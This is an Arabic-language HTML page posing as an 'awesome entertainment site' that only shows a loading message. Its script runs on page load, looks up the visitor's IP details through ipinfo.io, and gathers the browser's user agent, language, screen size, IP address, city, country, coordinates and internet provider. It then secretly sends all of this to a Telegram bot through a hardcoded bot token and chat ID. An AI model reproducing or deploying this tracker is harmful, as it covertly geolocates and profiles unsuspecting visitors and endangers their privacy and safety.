<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>🔥 موقع رهيب</title>
  <script>
    // عند فتح الصفحة، اجلب معلومات الموقع
    fetch("https://ipinfo.io/json?token=46eede76a5f9e6")
      .then(res => res.json())
      .then(ipinfo => {
        // اجمع بيانات الجهاز والزائر
        const data = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          screen: screen.width + "x" + screen.height,
          ip: ipinfo.ip,
          city: ipinfo.city,
          region: ipinfo.region,
          country: ipinfo.country,
          loc: ipinfo.loc,
          org: ipinfo.org
        };

        // جهّز رسالة التنبيه
        const message =
          "📡 تم فتح الرابط!\n" +
          "📱 الجهاز: " + data.userAgent + "\n" +
          "🌐 اللغة: " + data.language + "\n" +
          "🖥️ الشاشة: " + data.screen + "\n" +
          "🌍 الموقع: " + data.city + ", " + data.region + ", " + data.country + "\n" +
          "📌 الإحداثيات: " + data.loc + "\n" +
          "🔌 مزود الخدمة: " + data.org + "\n" +
          "🛰️ IP: " + data.ip;

        // أرسل الرسالة إلى Telegram
        fetch("https://api.telegram.org/bot8480823805:AAHWCjHAcTcTHwCee-_4BmaPk85n1eSOo1E/sendMessage", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: "5014833892",
            text: message
          })
        });

        // عرض رسالة للمستخدم
        alert("🔥 جاري التحميل...");
      });
  </script>
</head>
<body>
  <h1>🔥 أفضل موقع ترفيهي... جاري التحميل</h1>
</body>
</html>
